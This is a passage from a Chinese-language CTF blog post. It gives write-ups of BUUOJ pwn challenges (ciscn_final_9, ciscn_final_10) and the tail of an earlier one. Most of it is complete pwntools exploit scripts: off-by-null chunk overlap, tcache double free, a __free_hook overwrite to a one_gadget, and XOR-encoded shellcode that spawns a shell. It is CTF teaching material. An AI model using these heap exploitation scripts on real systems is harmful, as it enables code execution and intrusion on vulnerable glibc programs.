p.recvline()</span><br><span class="line"><span class="keyword">assert</span>(len(digest) == <span class="number">0x22</span> <span class="keyword">and</span> digest[<span class="number">-2</span>] == <span class="string">'0'</span>)</span><br><span class="line">digest = digest[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># restore the second user</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x40</span> + <span class="string">'\x00'</span> * <span class="number">0x4</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>) + p32(<span class="number">1</span>) + <span class="string">"user1"</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>, <span class="string">"\x00"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># test the second user</span></span><br><span class="line"><span class="comment"># quit()</span></span><br><span class="line"><span class="comment"># login(1, 1, "0")</span></span><br><span class="line"><span class="comment"># quit()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reigster the third user</span></span><br><span class="line">password = p64(<span class="number">2</span>) + p32(<span class="number">1</span>) + <span class="string">"admin"</span></span><br><span class="line">password += <span class="string">"2"</span></span><br><span class="line">password = password.ljust(<span class="number">0x24</span>, <span class="string">"\x00"</span>)</span><br><span class="line">password += digest</span><br><span class="line">password += <span class="string">"0"</span></span><br><span class="line">password = password.ljust(<span class="number">0x64</span>, <span class="string">"\x00"</span>)</span><br><span class="line">register(<span class="number">0</span>, <span class="number">0x64</span>, password, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the SM3 of the password</span></span><br><span class="line">login(<span class="number">1</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line">set_content(<span class="number">0x70</span>, <span class="string">'A'</span> * <span class="number">0x6C</span> + <span class="string">"SM3:"</span>)</span><br><span class="line">whoami()</span><br><span class="line">p.recvuntil(<span class="string">"SM3:"</span>)</span><br><span class="line">digest = p.recvline()</span><br><span class="line"><span class="keyword">assert</span>(len(digest) == <span class="number">0x22</span> <span class="keyword">and</span> digest[<span class="number">-2</span>] == <span class="string">'0'</span>)</span><br><span class="line">digest = digest[:<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake the third user as admin</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x4C</span></span><br><span class="line">payload += password</span><br><span class="line">payload += digest</span><br><span class="line">set_content(<span class="number">0x84</span> + <span class="number">0x4C</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login as admin</span></span><br><span class="line">quit()</span><br><span class="line">login(<span class="number">2</span>, <span class="number">1</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># getflag</span></span><br><span class="line">getflag()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ciscn-final-9"><a href="#ciscn-final-9" class="headerlink" title="ciscn_final_9"></a>ciscn_final_9</h1><h2 id="前言-8"><a href="#前言-8" class="headerlink" title="前言"></a>前言</h2><p>明显的off by null，通过unlink形成chunk overlap，因为看错了<code>if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))</code>判断条件一度怀疑人生（甚至怀疑以前怎么做unlink的）。</p>
<h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><ol>
<li>分配所有10个chunk，将后面的7个chunk释放并填满tcache bin。</li>
<li>剩下的三个chunk通过off by null形成chunk overlap，需要满足相应的<code>fd</code>，<code>bk</code>，<code>prev_size</code>字段。</li>
<li>由于”\x00\x02”(<code>prev_size=0x200</code>)无法直接写进去，这里需要连续释放剩下的3个chunk，使得第三个chunk的<code>prev_size</code>会被写入<code>0x200</code>。</li>
<li>将所有10个chunk又全部从bin中分配出来。</li>
<li>释放除了3个上述提到的unsorted bin之外的7个chunk中的6个，以填充6个tcache bin的位置。</li>
<li>将3个unsorted bin中位于中间位置的chunk释放到tcache bin中，从而下一次分配就能分配到该chunk，将size设置为<code>0x78</code>从而覆盖第三个unsorted bin的<code>prev_inuse</code>标志位为0。</li>
<li>再次将tcache bin重新填满，释放第一个unsorted bin，满足<code>fd</code>和<code>bk</code>的约束。</li>
<li>此时再次释放第三个unsorted bin，此时触发unlink，获得0x300的unsorted bin，第二个unsorted bin被overlap，从而可以被二次分配。</li>
<li>之后就利用tcache double free，写<code>__free_hook</code>为onegadget，触发<code>free</code>来getshell。</li>
</ol>
<h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size \n&gt; "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"content \n&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index \n&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"which command?\n&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index \n&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10a38c</span></span><br><span class="line">one_gadget_offset = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 10 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">4</span>, <span class="string">"AAAA\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc 10 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"BBBB\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># put chunk 7 into unsorted bin</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"CCCC\n"</span>) <span class="comment"># leave one tacache bin for chunk 8</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment"># put chunk 8 into tcache bin</span></span><br><span class="line">new(<span class="number">0xF8</span>, <span class="string">"DDDD\n"</span>) <span class="comment"># off by null to chunk 9</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># fill tcache bin</span></span><br><span class="line">delete(<span class="number">9</span>) <span class="comment"># unlink</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># take all tcache bin out</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(<span class="number">0xF0</span>, <span class="string">"EEEE\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"FFFF\n"</span>) <span class="comment"># chunk 8</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"GGGG\n"</span>) <span class="comment"># chunk 9</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># prepare enough space</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="number">0xF0</span>, p64(__free_hook)) <span class="comment"># chunk 0</span></span><br><span class="line">new(<span class="number">0xF0</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">new(<span class="number">0xF0</span>, p64(one_gadget)) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="ciscn-final-10"><a href="#ciscn-final-10" class="headerlink" title="ciscn_final_10"></a>ciscn_final_10</h1><h2 id="前言-9"><a href="#前言-9" class="headerlink" title="前言"></a>前言</h2><p>这个应该巨简单了，根本没难点。</p>
<h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><ol>
<li>首先要通过check才能进行后续操作，随机数肯定是才不到的，后续只要输入一个低2 bytes为0的负数就能通过check了。</li>
<li>后面就是明显的tcache double free。</li>
<li>通过partial write tcache bin，分配到储存<code>The cake is not a lie!</code>的chunk，将其改写为<code>The cake is a lie!</code>。</li>
<li>之后输入一个无效选项（比如3）触发后续接受输入，在对该输入进行简单的异或操作后当作指令执行的功能。</li>
<li>对shellcode进行对应的处理之后作为输入，然后就能getshell了。</li>
</ol>
<h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"-65536"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"-65536"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    shellcode = [ord(item) <span class="keyword">for</span> item <span class="keyword">in</span> shellcode][::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            payload += chr(shellcode[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += chr(ord(payload[i - <span class="number">1</span>]) ^ shellcode[i])</span><br><span class="line">    <span class="keyword">return</span> payload[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get access right</span></span><br><span class="line">access()</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="comment"># change str</span></span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"\x90"</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">new(<span class="number">0x38</span>, <span class="string">"The cake is a lie!\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send shellcode</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt; "</span>, gen_shellcode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Nop</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://n0nop.com/2020/05/05/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%B8%80/">https://n0nop.com/2020/05/05/BUUOJ-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%B8%80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/05/06/kernel-pwn-ROP/"><i class="fa fa-chevron-left">  </i><span>kernel pwn: ROP</span></a></div><div class="next-post pull-right"><a href="/2020/04/21/pwn-fsb-printable/"><span>pwn fsb: printable</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == 'true';
var verify = 'false' == 'true';
var record_ip = 'false' == 'true';
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  recordIP:record_ip,
  appId:'r5Gkikl9GU9Oux3XiRu5Xtel-MdYXbMMI',
  appKey:'zSDYDqmNTxhb5QxupwDuYOxQ',
  placeholder:'......',
  avatar:'',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://n0nop.com/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By Nop</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>